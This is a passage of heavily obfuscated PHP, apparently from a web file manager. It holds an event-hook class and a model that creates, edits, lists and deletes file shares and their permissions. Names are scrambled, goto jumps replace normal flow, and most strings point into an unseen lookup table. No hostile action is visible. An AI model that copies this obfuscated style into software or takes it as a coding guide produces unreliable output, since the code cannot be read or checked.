$EÎáÚÁ†Š, $cÖåŞÈßáš = false) { $Aç­™ˆÙ½ =& $_SERVER[Äº¡•ô™Ÿ]; if (!isset(self::$events[$E°â‘ÑÂàÙ])) { self::$events[$E°â‘ÑÂàÙ] = array(); } self::$events[$E°â‘ÑÂàÙ][] = array($Aç­™ˆÙ½[1726] => $EÎáÚÁ†Š, $Aç­™ˆÙ½[1727] => $cÖåŞÈßáš, $Aç­™ˆÙ½[1728] => 0); } public static function once($DÙÛ•ƒôà, $cê¤åÇÖ) { self::bind($DÙÛ•ƒôà, $cê¤åÇÖ, !0); } public static function unbind($e¢µÅƒ¯², $E‡‘á›‰ñ˜ = false) { if (!$E‡‘á›‰ñ˜) { self::$events[$e¢µÅƒ¯²] = array(); return; } $c’«³‘ô = self::$events[$e¢µÅƒ¯²]; self::$events[$e¢µÅƒ¯²] = array(); if (!is_array($c’«³‘ô)) { return; } for ($E‚½Ë›Ô = 0; $E‚½Ë›Ô < count($c’«³‘ô); $E‚½Ë›Ô++) { if ($c’«³‘ô[$E‚½Ë›Ô][$_SERVER[Äº¡•ô™Ÿ][1726]] == $E‡‘á›‰ñ˜) { continue; } self::$events[$e¢µÅƒ¯²][] = $c’«³‘ô[$E‚½Ë›Ô]; } } public static function filter($E¥›à±×¦, $e«ÓòÒ‡Ÿª) { goto C­Ç†ƒàä†; C­Ç†ƒàä†: $céÍ¸Ê˜ =& $_SERVER[Äº¡•ô™Ÿ]; $cÈå¡Öè‡Ñ = self::$events; if (!isset($cÈå¡Öè‡Ñ[$E¥›à±×¦])) { return $e«ÓòÒ‡Ÿª; } goto BáôÖèçÇ²; EĞ“Ê¦ÊÛÕ: for ($F¢™ö˜ÇÊ¶ = 0; $F¢™ö˜ÇÊ¶ < count($BÅ»¼«ë¬š); $F¢™ö˜ÇÊ¶++) { $aïÃ»¿„‰Ñ = $BÅ»¼«ë¬š[$F¢™ö˜ÇÊ¶]; if ($aïÃ»¿„‰Ñ[$céÍ¸Ê˜[1727]] && $aïÃ»¿„‰Ñ[$céÍ¸Ê˜[1728]] > 1) { continue; } self::$events[$E¥›à±×¦][$F¢™ö˜ÇÊ¶][$céÍ¸Ê˜[1728]] = $aïÃ»¿„‰Ñ[$céÍ¸Ê˜[1728]] + 1; $bõõã‰„ñ» = self::apply($aïÃ»¿„‰Ñ[$céÍ¸Ê˜[1726]], array($FÈğ¿š¿‰î)); if (!is_null($bõõã‰„ñ»)) { $FÈğ¿š¿‰î = $bõõã‰„ñ»; } } return $FÈğ¿š¿‰î; goto F÷ÌùÛÌ; BáôÖèçÇ²: $BÅ»¼«ë¬š = $cÈå¡Öè‡Ñ[$E¥›à±×¦]; $FÈğ¿š¿‰î = $e«ÓòÒ‡Ÿª; if (!is_array($BÅ»¼«ë¬š) || count($BÅ»¼«ë¬š) == 0) { return $FÈğ¿š¿‰î; } goto EĞ“Ê¦ÊÛÕ; F÷ÌùÛÌ: } public static function trigger($fç„–µË) { goto B¡·âíº; B¡·âíº: $CÔñàĞÃ =& $_SERVER[Äº¡•ô™Ÿ]; $d™ëÀÁÀ… = self::$events; $A‹ÑíÇ˜È = !1; goto cåãÓìäÆÙ; C…Üß¸’æì: $fòèìèÓœ = func_get_args(); array_shift($fòèìèÓœ); for ($eÁ¿›´ñ¹» = 0; $eÁ¿›´ñ¹» < count($fÒÌ´„åŒô); $eÁ¿›´ñ¹»++) { $aµ´ÇÒŸÃà = $fÒÌ´„åŒô[$eÁ¿›´ñ¹»]; if ($aµ´ÇÒŸÃà[$CÔñàĞÃ[1727]] && $aµ´ÇÒŸÃà[$CÔñàĞÃ[1728]] > 1) { continue; } if (defined($CÔñàĞÃ[1729]) && GLOBAL_LOG_HOOK) { write_log($fç„–µË . $CÔñàĞÃ[1730] . $aµ´ÇÒŸÃà[$CÔñàĞÃ[1726]], $CÔñàĞÃ[1731]); } self::$events[$fç„–µË][$eÁ¿›´ñ¹»][$CÔñàĞÃ[1728]] = $aµ´ÇÒŸÃà[$CÔñàĞÃ[1728]] + 1; $dì¬Äİâ×Ë = self::apply($aµ´ÇÒŸÃà[$CÔñàĞÃ[1726]], $fòèìèÓœ); if (defined($CÔñàĞÃ[1729]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $CÔñàĞÃ[1731]); if ($aµ´ÇÒŸÃà[$CÔñàĞÃ[1728]] == 200) { $AÈ–«İš…î = is_array($aµ´ÇÒŸÃà[$CÔñàĞÃ[1726]]) ? json_encode_force($aµ´ÇÒŸÃà[$CÔñàĞÃ[1726]]) : $aµ´ÇÒŸÃà[$CÔñàĞÃ[1726]]; write_log($CÔñàĞÃ[1732] . $fç„–µË . $CÔñàĞÃ[1733] . $AÈ–«İš…î, $CÔñàĞÃ[1734]); } } $A‹ÑíÇ˜È = is_null($dì¬Äİâ×Ë) ? $A‹ÑíÇ˜È : $dì¬Äİâ×Ë; } goto fìÃÀëÒ; cåãÓìäÆÙ: if (!isset($d™ëÀÁÀ…[$fç„–µË])) { return $A‹ÑíÇ˜È; } $fÒÌ´„åŒô = $d™ëÀÁÀ…[$fç„–µË]; if (!is_array($fÒÌ´„åŒô) || count($fÒÌ´„åŒô) == 0) { return $A‹ÑíÇ˜È; } goto C…Üß¸’æì; fìÃÀëÒ: return $A‹ÑíÇ˜È; goto AÅğ’òÓº; AÅğ’òÓº: } } goto bÑåä’í»; b ßÆàà¿: function beforeShutdown() { Hook::trigger($_SERVER[•Éº±‡£‰èä][36]); } $_SERVER[$_SERVER[•Éº±‡£‰èä][37]] = BASIC_PATH; $_SERVER[$_SERVER[•Éº±‡£‰èä][38]] = LIB_DIR; goto eè…²ÆÉÈ; FÃ‡šŠÓå : class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\162\x65"; protected $dataAuto = array(array("\x6d\157\x64\151\146\171\124\x69\155\x65", "\164\151\x6d\x65", "\x69\156\x73\x65\x72\164\54\x75\x70\144\141\164\145", "\146\165\x6e\143\164\x69\x6f\156"), array("\x63\162\145\141\164\145\x54\x69\x6d\145", "\164\151\x6d\145", "\x69\156\x73\145\162\x74", "\x66\165\156\x63\x74\151\x6f\156"), array("\157\x70\x74\x69\x6f\x6e\x73", '', "\151\156\x73\145\x72\x74\54\165\160\x64\141\164\x65\x2c\163\145\x6c\x65\143\164", "\x6a\163\157\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($FêÑñ…¾) { $fÌÔ´Ğ•Ç =& $_SERVER[Äº¡•ô™Ÿ]; $eë¾Ü†ÕÃŸ = isset($FêÑñ…¾[0]) ? $FêÑñ…¾[0] : !1; return array($fÌÔ´Ğ•Ç[2184] => array(USER_ID, $fÌÔ´Ğ•Ç[2185]), $fÌÔ´Ğ•Ç[2147] => array($eë¾Ü†ÕÃŸ, $fÌÔ´Ğ•Ç[2186])); } protected function listSimple() { $dæá’‚æœ” = array($_SERVER[Äº¡•ô™Ÿ][1416] => USER_ID); $Aß÷÷‡œÂè = $this->field($this->fieldList)->where($dæá’‚æœ”)->select(); return $Aß÷÷‡œÂè ? $Aß÷÷‡œÂè : array(); } protected function getInfo($d‡Œ¶¦ä¯ˆ, $aµÌ×‘©óÅ = false) { $B‹íİ“õ‡² =& $_SERVER[Äº¡•ô™Ÿ]; if ($aµÌ×‘©óÅ) { return $this->_getShareInfo(array($B‹íİ“õ‡²[437] => $d‡Œ¶¦ä¯ˆ)); } $FÂŠ ½œ› = $this->cacheFunctionGet($B‹íİ“õ‡²[2187], $d‡Œ¶¦ä¯ˆ); return $FÂŠ ½œ›; } public function getInfoByHash($EÖ¡‰¢÷õÑ) { return $this->_getShareInfo(array($_SERVER[Äº¡•ô™Ÿ][439] => $EÖ¡‰¢÷õÑ)); } public function getInfoByPath($DØŠôç•µŞ) { $d½»Ø—¸¯ƒ =& $_SERVER[Äº¡•ô™Ÿ]; $eÍ”ĞÊÆá = array($d½»Ø—¸¯ƒ[1416] => USER_ID, $d½»Ø—¸¯ƒ[366] => $DØŠôç•µŞ); return $this->_getShareInfo($eÍ”ĞÊÆá); } public function getInfoBySourcePath($B×˜Ñ¦‰) { $Ağ¼ÁôÈ´ô =& $_SERVER[Äº¡•ô™Ÿ]; $DöºŠÒºÃ = array($Ağ¼ÁôÈ´ô[1416] => USER_ID, $Ağ¼ÁôÈ´ô[1018] => $B×˜Ñ¦‰); return $this->_getShareInfo($DöºŠÒºÃ); } private function _getShareInfo($eôà‰£•êš) { goto açäîçÕÙ†; A°Öóù½Îà: if ($Dãæ×”ĞÖ‰[$fÛäåª˜Ø[366]] == $fÛäåª˜Ø[464]) { $Dãæ×”ĞÖ‰[$fÛäåª˜Ø[388]] = IO::info($Dãæ×”ĞÖ‰[$fÛäåª˜Ø[1018]]); } else { $Dãæ×”ĞÖ‰[$fÛäåª˜Ø[388]] = Model($fÛäåª˜Ø[1110])->pathInfo($Dãæ×”ĞÖ‰[$fÛäåª˜Ø[366]]); } $Dãæ×”ĞÖ‰[$fÛäåª˜Ø[2189]] = $e‚›¤ÏÃÛ; return $Dãæ×”ĞÖ‰; goto fù«¶‘ğ³¤; açäîçÕÙ†: $fÛäåª˜Ø =& $_SERVER[Äº¡•ô™Ÿ]; $Dãæ×”ĞÖ‰ = $this->where($eôà‰£•êš)->find(); if (!$Dãæ×”ĞÖ‰) { return !1; } goto aì˜¡½Ä¤; aì˜¡½Ä¤: $eôà‰£•êš = array($fÛäåª˜Ø[437] => $Dãæ×”ĞÖ‰[$fÛäåª˜Ø[437]]); $Eï¶Çëõ¿Ò = $fÛäåª˜Ø[2188]; $e‚›¤ÏÃÛ = Model($fÛäåª˜Ø[533])->order($fÛäåª˜Ø[364])->field($Eï¶Çëõ¿Ò)->where($eôà‰£•êš)->select(); goto A°Öóù½Îà; fù«¶‘ğ³¤: } protected function getInfoAuth($c‹£Ã±İÅÊ) { $aÈ©ºÃ¤Ìİ =& $_SERVER[Äº¡•ô™Ÿ]; $b÷ôçÍŒ© = $this->getInfo($c‹£Ã±İÅÊ); $b÷ôçÍŒ©[$aÈ©ºÃ¤Ìİ[373]] = Model($aÈ©ºÃ¤Ìİ[450])->authMake($b÷ôçÍŒ©[$aÈ©ºÃ¤Ìİ[2189]]); return $b÷ôçÍŒ©; } protected function listData($A‘ğ§ÎÑšÎ = null, $EèïœÁÚë = 300) { $dƒå…±ÆÜ¬ =& $_SERVER[Äº¡•ô™Ÿ]; $C¡½†®ÁŞÔ = array(array($dƒå…±ÆÜ¬[442] => array($dƒå…±ÆÜ¬[928], 0), $dƒå…±ÆÜ¬[444] => array($dƒå…±ÆÜ¬[928], 0), $dƒå…±ÆÜ¬[2190] => $dƒå…±ÆÜ¬[2159])); if ($A‘ğ§ÎÑšÎ == $dƒå…±ÆÜ¬[1846]) { $C¡½†®ÁŞÔ = array($dƒå…±ÆÜ¬[442] => 1); } else { if ($A‘ğ§ÎÑšÎ == $dƒå…±ÆÜ¬[1007]) { $C¡½†®ÁŞÔ = array($dƒå…±ÆÜ¬[444] => 1); } } $C¡½†®ÁŞÔ[$dƒå…±ÆÜ¬[1416]] = USER_ID; $d‰İ‘äÃÇ = $this->where($C¡½†®ÁŞÔ)->selectPage($EèïœÁÚë); return $d‰İ‘äÃÇ; } protected function listToMe($B¶ÏÅ†íÊ = 300) { goto bñ´‡¤ª‡º; bñ´‡¤ª‡º: $e¤¥ÏªÍ­Ù =& $_SERVER[Äº¡•ô™Ÿ]; $AÍ¼ˆ´”ªµ = Session::get($e¤¥ÏªÍ­Ù[2191]); $aùñÇå¶ = array_to_keyvalue($AÍ¼ˆ´”ªµ, $e¤¥ÏªÍ­Ù[33], $e¤¥ÏªÍ­Ù[2079]); goto d¿ˆÒÎ‡Ó; a›‚½—­¢¬: $AŸõ÷˜‚¿Ô = array($e¤¥ÏªÍ­Ù[2193] => $còÀ¢¨êÃê, $e¤¥ÏªÍ­Ù[2194] => $b½ëŞÕ®šä[$e¤¥ÏªÍ­Ù[348]]); return $AŸõ÷˜‚¿Ô; goto dô¹ÜªÜó®; cƒ×êß©ˆ¾: $FÇËƒÓÛ‘‚ = array($e¤¥ÏªÍ­Ù[437] => array($e¤¥ÏªÍ­Ù[381], array_keys($døò»ìØ¡è))); $còÀ¢¨êÃê = $this->field($E¦ÂâíÈ†‚)->where($FÇËƒÓÛ‘‚)->select(); foreach ($còÀ¢¨êÃê as $DªŸĞ÷‹Õ => &$a­ÄÊ¬ÔÉ“) { $a­ÄÊ¬ÔÉ“[$e¤¥ÏªÍ­Ù[2189]] = $døò»ìØ¡è[$a­ÄÊ¬ÔÉ“[$e¤¥ÏªÍ­Ù[437]]]; } goto a›‚½—­¢¬; A‚Ÿêğíƒ : $døò»ìØ¡è = array_to_keyvalue_group($b½ëŞÕ®šä[$e¤¥ÏªÍ­Ù[351]], $e¤¥ÏªÍ­Ù[437]); if (!$døò»ìØ¡è) { return $b½ëŞÕ®šä; } $E¦ÂâíÈ†‚ = $e¤¥ÏªÍ­Ù[2192]; goto cƒ×êß©ˆ¾; d¿ˆÒÎ‡Ó: $FÇËƒÓÛ‘‚ = array($e¤¥ÏªÍ­Ù[517] => SourceModel::TYPE_USER, $e¤¥ÏªÍ­Ù[452] => USER_ID); if ($aùñÇå¶) { $FÇËƒÓÛ‘‚ = array(array($e¤¥ÏªÍ­Ù[517] => SourceModel::TYPE_USER, $e¤¥ÏªÍ­Ù[452] => USER_ID), array($e¤¥ÏªÍ­Ù[517] => SourceModel::TYPE_GROUP, $e¤¥ÏªÍ­Ù[452] => array($e¤¥ÏªÍ­Ù[7], $aùñÇå¶)), $e¤¥ÏªÍ­Ù[2190] => $e¤¥ÏªÍ­Ù[2159]); } $b½ëŞÕ®šä = Model($e¤¥ÏªÍ­Ù[533])->where($FÇËƒÓÛ‘‚)->selectPage($B¶ÏÅ†íÊ); goto A‚Ÿêğíƒ ; dô¹ÜªÜó®: } protected function shareAdd($eä‘‡£‘Ä¾, $dö—‚™‰•) { $AÊ‚ÑÃ†¡ƒ =& $_SERVER[Äº¡•ô™Ÿ]; $FµººÍ¶› = $this->_addShareData($eä‘‡£‘Ä¾, $dö—‚™‰•); if (!empty($dö—‚™‰•[$AÊ‚ÑÃ†¡ƒ[2195]])) { $this->_shareAuthSet($FµººÍ¶›, $dö—‚™‰•[$AÊ‚ÑÃ†¡ƒ[2195]]); } $this->shareEventAdd($eä‘‡£‘Ä¾, $dö—‚™‰•, $AÊ‚ÑÃ†¡ƒ[1010]); return $FµººÍ¶›; } private function shareEventAdd($fí´ˆ¢Ï®, $c‰ºåìÜöÀ, $BìÄ¢“ùÎ‡ = "\141\x64\x64") { goto FÀÊç”±“; a†Ëë•Ñ¡à: return; goto FÅ¤ƒÌòã; FÀÊç”±“: $F‹­éÏ“Ú =& $_SERVER[Äº¡•ô™Ÿ]; if ($BìÄ¢“ùÎ‡ == $F‹­éÏ“Ú[1010]) { if ($c‰ºåìÜöÀ[$F‹­éÏ“Ú[442]] == $F‹­éÏ“Ú[83]) { Model($F‹­éÏ“Ú[501])->eventShare($fí´ˆ¢Ï®, $F‹­éÏ“Ú[2196]); } if ($c‰ºåìÜöÀ[$F‹­éÏ“Ú[444]] == $F‹­éÏ“Ú[83]) { Model($F‹­éÏ“Ú[501])->eventShare($fí´ˆ¢Ï®, $F‹­éÏ“Ú[2197]); } return; } $D•Ô±ã»ğ¯ = $this->getInfoByPath($fí´ˆ¢Ï®); goto dæ¸Ó²è; dæ¸Ó²è: $fÒèğ‘ƒƒ = $F‹­éÏ“Ú[2198]; if ($D•Ô±ã»ğ¯[$F‹­éÏ“Ú[442]] == $F‹­éÏ“Ú[464] && $c‰ºåìÜöÀ[$F‹­éÏ“Ú[442]] == $F‹­éÏ“Ú[83]) { $fÒèğ‘ƒƒ = $F‹­éÏ“Ú[2196]; } if ($D•Ô±ã»ğ¯[$F‹­éÏ“Ú[442]] == $F‹­éÏ“Ú[83] && $c‰ºåìÜöÀ[$F‹­éÏ“Ú[442]] == $F‹­éÏ“Ú[464]) { $fÒèğ‘ƒƒ = $F‹­éÏ“Ú[2199]; } goto E¬ÌáĞô›Á; E¬ÌáĞô›Á: if ($D•Ô±ã»ğ¯[$F‹­éÏ“Ú[444]] == $F‹­éÏ“Ú[464] && $c‰ºåìÜöÀ[$F‹­éÏ“Ú[444]] == $F‹­éÏ“Ú[83]) { $fÒèğ‘ƒƒ = $F‹­éÏ“Ú[2197]; } if ($D•Ô±ã»ğ¯[$F‹­éÏ“Ú[444]] == $F‹­éÏ“Ú[83] && $c‰ºåìÜöÀ[$F‹­éÏ“Ú[444]] == $F‹­éÏ“Ú[464]) { $fÒèğ‘ƒƒ = $F‹­éÏ“Ú[2200]; } Model($F‹­éÏ“Ú[501])->eventShare($fí´ˆ¢Ï®, $fÒèğ‘ƒƒ); goto a†Ëë•Ñ¡à; FÅ¤ƒÌòã: } private function _addShareData($FÙøŠ´‡Ô, $A„ Öò£² = array()) { goto cÈµİõ‹½; C¡‰‚Åë¨İ: $a¹’ò·ƒÃº = $this->add($cÈ±¢ºÃä); $AÎ‘”êƒ¼í = array($AšĞÁÉóÒ©[439] => short_id($a¹’ò·ƒÃº)); $this->where(array($AšĞÁÉóÒ©[436] => $a¹’ò·ƒÃº))->save($AÎ‘”êƒ¼í); goto aæÖĞ‰Ã†ˆ; cÈµİõ‹½: $AšĞÁÉóÒ© =& $_SERVER[Äº¡•ô™Ÿ]; $c˜èì»ö = array($AšĞÁÉóÒ©[380] => $FÙøŠ´‡Ô, $AšĞÁÉóÒ©[1407] => USER_ID); if ($FÙøŠ´‡Ô == 0) { $c˜èì»ö = array($AšĞÁÉóÒ©[2201] => $A„ Öò£²[$AšĞÁÉóÒ©[1018]], $AšĞÁÉóÒ©[1407] => USER_ID); } goto bÄŠÈ¼Š’; aæÖĞ‰Ã†ˆ: return $a¹’ò·ƒÃº; goto A¨ÏåĞ˜í; bÄŠÈ¼Š’: if ($eª®‘ÍŠ—ó = $this->where($c˜èì»ö)->find()) { return $eª®‘ÍŠ—ó[$AšĞÁÉóÒ©[437]]; } if ($FÙøŠ´‡Ô == 0) { $fÏîÈÃ¦‘ì = array($AšĞÁÉóÒ©[28] => get_path_this($A„ Öò£²[$AšĞÁÉóÒ©[75]])); } else { $fÏîÈÃ¦‘ì = Model($AšĞÁÉóÒ©[755])->sourceInfo($FÙøŠ´‡Ô); if (!$fÏîÈÃ¦‘ì) { return !1; } } if (!$A„ Öò£²[$AšĞÁÉóÒ©[1321]]) { $A„ Öò£²[$AšĞÁÉóÒ©[1321]] = $fÏîÈÃ¦‘ì[$AšĞÁÉóÒ©[28]]; } goto a“Ëù°ã¡; a“Ëù°ã¡: $cÈ±¢ºÃä = array($AšĞÁÉóÒ©[1407] => USER_ID, $AšĞÁÉóÒ©[380] => $FÙøŠ´‡Ô, $AšĞÁÉóÒ©[1321] => $AšĞÁÉóÒ©[33], $AšĞÁÉóÒ©[442] => 0, $AšĞÁÉóÒ©[444] => 0, $AšĞÁÉóÒ©[1018] => $AšĞÁÉóÒ©[33], $AšĞÁÉóÒ©[292] => $AšĞÁÉóÒ©[33], $AšĞÁÉóÒ©[804] => $AšĞÁÉóÒ©[33], $AšĞÁÉóÒ©[2202] => 0, $AšĞÁÉóÒ©[2203] => 0, $AšĞÁÉóÒ©[706] => 0, $AšĞÁÉóÒ©[2204] => $AšĞÁÉóÒ©[33], $AšĞÁÉóÒ©[439] => $AšĞÁÉóÒ©[33]); $CÙé¡‡Ó› = explode($AšĞÁÉóÒ©[47], $AšĞÁÉóÒ©[2205]); foreach ($CÙé¡‡Ó› as $b‘ã™´¡Ô) { if (!isset($A„ Öò£²[$b‘ã™´¡Ô])) { continue; } $cÈ±¢ºÃä[$b‘ã™´¡Ô] = $A„ Öò£²[$b‘ã™´¡Ô]; } goto C¡‰‚Åë¨İ; A¨ÏåĞ˜í: } private function _shareAuthSet($D©¢ª§‘æç, $CîêÁÈÌÀŞ) { goto B‡ÑÖæÆéÕ; B¼©Ì’”¤: return $A¶ôÆ£¦Äµ->addAll($c†™ µÓŒ, array(), !0); goto F½à­½ñÄ›; B‡ÑÖæÆéÕ: $cë‚­ØÑ¶õ =& $_SERVER[Äº¡•ô™Ÿ]; if (!is_array($CîêÁÈÌÀŞ)) { return !1; } $A¶ôÆ£¦Äµ = Model($cë‚­ØÑ¶õ[2206]); goto c¸ƒ‰ôŸïè; c¸ƒ‰ôŸïè: $A¶ôÆ£¦Äµ->where(array($cë‚­ØÑ¶õ[437] => $D©¢ª§‘æç))->delete(); $c†™ µÓŒ = array(); foreach ($CîêÁÈÌÀŞ as $F¯æ»…Úù) { $AÁ¢·Ò‚æ“ = SourceModel::TYPE_USER; if ($F¯æ»…Úù[$cë‚­ØÑ¶õ[368]] == SourceModel::TYPE_GROUP) { $AÁ¢·Ò‚æ“ = SourceModel::TYPE_GROUP; } $EØËˆğ¸¿º = array($cë‚­ØÑ¶õ[437] => $D©¢ª§‘æç, $cë‚­ØÑ¶õ[368] => $AÁ¢·Ò‚æ“, $cë‚­ØÑ¶õ[452] => intval($F¯æ»…Úù[$cë‚­ØÑ¶õ[452]]), $cë‚­ØÑ¶õ[2207] => 0, $cë‚­ØÑ¶õ[2208] => -1); if ($F¯æ»…Úù[$cë‚­ØÑ¶õ[2207]]) { $EØËˆğ¸¿º[$cë‚­ØÑ¶õ[2207]] = $F¯æ»…Úù[$cë‚­ØÑ¶õ[2207]]; } else { if ($F¯æ»…Úù[$cë‚­ØÑ¶õ[2208]]) { $EØËˆğ¸¿º[$cë‚­ØÑ¶õ[2208]] = $F¯æ»…Úù[$cë‚­ØÑ¶õ[2208]]; } } $c†™ µÓŒ[] = $EØËˆğ¸¿º; } goto B¼©Ì’”¤; F½à­½ñÄ›: } public function numViewAdd($C†ğùÓõÑ©) { $BÂ‰”‰ÀÍĞ =& $_SERVER[Äº¡•ô™Ÿ]; $C¬ÜŠƒğ®­ = array($BÂ‰”‰ÀÍĞ[436] => $C†ğùÓõÑ©); $this->where($C¬ÜŠƒğ®­)->setAdd($BÂ‰”‰ÀÍĞ[2202]); } public function numDownloadAdd($F‡»ë•–ìŸ) { $Dİóğ¢Ã =& $_SERVER[Äº¡•ô™Ÿ]; $d¸è°Ñ„ˆ = array($Dİóğ¢Ã[436] => $F‡»ë•–ìŸ); $this->where($d¸è°Ñ„ˆ)->setAdd($Dİóğ¢Ã[2203]); } protected function shareEdit($E‡‚Ü£ğò‹, $fëƒåÃ•«í) { goto F‚ó…¨Â…ù; F‚ó…¨Â…ù: $e‚ÙëÛµ×ˆ =& $_SERVER[Äº¡•ô™Ÿ]; $d¥Ãƒâ¹Ç… = $this->getInfo($E‡‚Ü£ğò‹); if (!$d¥Ãƒâ¹Ç…) { return !1; } goto dé¾ïª‚™Ö; e„ïğÂï–É: if (isset($fëƒåÃ•«í[$e‚ÙëÛµ×ˆ[2195]])) { $this->_shareAuthSet($E‡‚Ü£ğò‹, $fëƒåÃ•«í[$e‚ÙëÛµ×ˆ[2195]]); } return !0; goto cÊÎß†¤ª¤; dé¾ïª‚™Ö: $this->_checkLinkShare($fëƒåÃ•«í, $d¥Ãƒâ¹Ç…); $bñœ‰®ï¢½ = array(); $a¯‹ĞÇ‚õ¼ = explode($e‚ÙëÛµ×ˆ[47], $e‚ÙëÛµ×ˆ[2209]); goto a’Îš‰ ; a’Îš‰ : foreach ($a¯‹ĞÇ‚õ¼ as $fÓ³ÕÑ›—´) { if (!array_key_exists($fÓ³ÕÑ›—´, $fëƒåÃ•«í)) { continue; } $bñœ‰®ï¢½[$fÓ³ÕÑ›—´] = $fëƒåÃ•«í[$fÓ³ÕÑ›—´]; } $this->shareEventAdd($d¥Ãƒâ¹Ç…[$e‚ÙëÛµ×ˆ[366]], $fëƒåÃ•«í, $e‚ÙëÛµ×ˆ[2047]); $this->where(array($e‚ÙëÛµ×ˆ[436] => $E‡‚Ü£ğò‹))->save($bñœ‰®ï¢½); goto e„ïğÂï–É; cÊÎß†¤ª¤: } private function _checkLinkShare($c…æƒàœÍ¿, $FïßœÍäĞ®) { goto bÚ˜ºà‰½Ş; f•íÈ¾ÚÑ: if ($FïßœÍäĞ®[$A½Ìš®ÖùÁ[388]][$A½Ìš®ÖùÁ[29]] != $A½Ìš®ÖùÁ[164]) { $e£¥Çİî´¤ = $this->_folderReport($dÒÍ›ç¦); if (!$e£¥Çİî´¤) { return; } show_json(LNG($A½Ìš®ÖùÁ[2210]) . $A½Ìš®ÖùÁ[2211] . $e£¥Çİî´¤, !1); } $E“®è¼¢Êğ = Model($A½Ìš®ÖùÁ[755])->fileInfoGet($FïßœÍäĞ®[$A½Ìš®ÖùÁ[388]][$A½Ìš®ÖùÁ[366]]); if (!$E“®è¼¢Êğ) { return; } goto e’Î‘ÊÅİ; bÚ˜ºà‰½Ş: $A½Ìš®ÖùÁ =& $_SERVER[Äº¡•ô™Ÿ]; if ($c…æƒàœÍ¿[$A½Ìš®ÖùÁ[442]] != $A½Ìš®ÖùÁ[83]) { return; } $dÒÍ›ç¦ = $FïßœÍäĞ®[$A½Ìš®ÖùÁ[388]][$A½Ìš®ÖùÁ[366]]; goto f•íÈ¾ÚÑ; e’Î‘ÊÅİ: $f¢‰««Ÿ„¦ = $this->shareFileMeta($E“®è¼¢Êğ[$A½Ìš®ÖùÁ[415]]); if (isset($f¢‰««Ÿ„¦[$A½Ìš®ÖùÁ[356]]) && $f¢‰««Ÿ„¦[$A½Ìš®ÖùÁ[356]] == $A½Ìš®ÖùÁ[83]) { show_json(LNG($A½Ìš®ÖùÁ[2212]), !1); } goto EÇï…¦Ø“º; EÇï…¦Ø“º: } private function _folderReport($eÕöîâñ¿½) { goto cğĞÂÎÙÍ¸; eÆ™Õ¹·å: if (!$fî‘Ø†Èç°) { return !1; } $fî‘Ø†Èç° = array_to_keyvalue($fî‘Ø†Èç°, $Eé›Â°îİ[33], $Eé›Â°îİ[415]); $a¹Ü×ä„¬õ = $Eé›Â°îİ[47] . $eÕöîâñ¿½ . $Eé›Â°îİ[47]; goto EÔ›Äá£¿¦; EÔ›Äá£¿¦: $fÒº²Úœ‚— = array($Eé›Â°îİ[415] => array($Eé›Â°îİ[7], $fî‘Ø†Èç°), $Eé›Â°îİ[455] => array($Eé›Â°îİ[754], "\45{$a¹Ü×ä„¬õ}\45"), $Eé›Â°îİ[393] => 0); $A ’œØàË = Model($Eé›Â°îİ[755])->where($fÒº²Úœ‚—)->field($Eé›Â°îİ[2214])->find(); if (!$A ’œØàË) { return !1; } goto cßØ†ÖÉÕ¸; cÑÊ®¼Ï ¼: $Bç§ëõë = array_to_keyvalue($FÙê–É©Æ, $Eé›Â°îİ[33], $Eé›Â°îİ[28]); $Bç§ëõë[] = $A ’œØàË[$Eé›Â°îİ[28]]; return implode($Eé›Â°îİ[8], $Bç§ëõë); goto Eáñ¥×½­; cğĞÂÎÙÍ¸: $Eé›Â°îİ =& $_SERVER[Äº¡•ô™Ÿ]; $fÒº²Úœ‚— = array($Eé›Â°îİ[415] => array($Eé›Â°îİ[928], 0), $Eé›Â°îİ[692] => 3); $fî‘Ø†Èç° = Model($Eé›Â°îİ[2213])->where($fÒº²Úœ‚—)->field($Eé›Â°îİ[415])->select(); goto eÆ™Õ¹·å; cßØ†ÖÉÕ¸: $C—óİÔèİÚ = substr($A ’œØàË[$Eé›Â°îİ[455]], strpos($A ’œØàË[$Eé›Â°îİ[455]], $a¹Ü×ä„¬õ)); $fÒº²Úœ‚— = array($Eé›Â°îİ[366] => array($Eé›Â°îİ[7], trim($C—óİÔèİÚ, $Eé›Â°îİ[47]))); $FÙê–É©Æ = Model($Eé›Â°îİ[755])->where($fÒº²Úœ‚—)->field($Eé›Â°îİ[28])->select(); goto cÑÊ®¼Ï ¼; Eáñ¥×½­: } protected function remove($f‚ÙÛ´À§ì) { goto Bë‰½…Š˜; dÑ›Ù¼›è: $DÔ¤îõë = $this->where($BÔ¬…Œß’°)->delete(); if ($DÔ¤îõë) { Model($CÕÅÀÑÆÁ²[533])->where(array($CÕÅÀÑÆÁ²[437] => $f‚ÙÛ´À§ì))->delete(); } $BğŸ¦âíËÒ = is_array($f‚ÙÛ´À§ì) ? $f‚ÙÛ´À§ì[1] : array($f‚ÙÛ´À§ì); goto D¢˜šÄ•‰®; Bë‰½…Š˜: $CÕÅÀÑÆÁ² =& $_SERVER[Äº¡•ô™Ÿ]; if (is_array($f‚ÙÛ´À§ì)) { $f‚ÙÛ´À§ì = array($CÕÅÀÑÆÁ²[7], $f‚ÙÛ´À§ì); } $BÔ¬…Œß’° = array($CÕÅÀÑÆÁ²[437] => $f‚ÙÛ´À§ì); goto dÑ›Ù¼›è; D¢˜šÄ•‰®: for ($báô–µ«“˜ = 0; $báô–µ«“˜ < count($BğŸ¦âíËÒ); $báô–µ«“˜++) { $D¶œëÛÙ‰Œ = $this->getInfo($BğŸ¦âíËÒ[$báô–µ«“˜]); if ($D¶œëÛÙ‰Œ[$CÕÅÀÑÆÁ²[444]] == $CÕÅÀÑÆÁ²[83]) { Model($CÕÅÀÑÆÁ²[501])->eventShare($D¶œëÛÙ‰Œ[$CÕÅÀÑÆÁ²[366]], $CÕÅÀÑÆÁ²[2200]); } if ($D¶œëÛÙ‰Œ[$CÕÅÀÑÆÁ²[442]] == $CÕÅÀÑÆÁ²[83]) { Model($CÕÅÀÑÆÁ²[501])->eventShare($D¶œëÛÙ‰Œ[$CÕÅÀÑÆÁ²[366]], $CÕÅÀÑÆÁ²[2199]); } } return $DÔ¤îõë; goto BÎ—ÄÛ‡Ñ‹; BÎ—ÄÛ‡Ñ‹: } protected function removeBySource($Fò¹ÇÓÁ‹Ã) { goto Eìä¿˜î­ˆ; b¶â×˜Ë¯†: $this->where($EÕÚ¾İµºØ)->delete(); 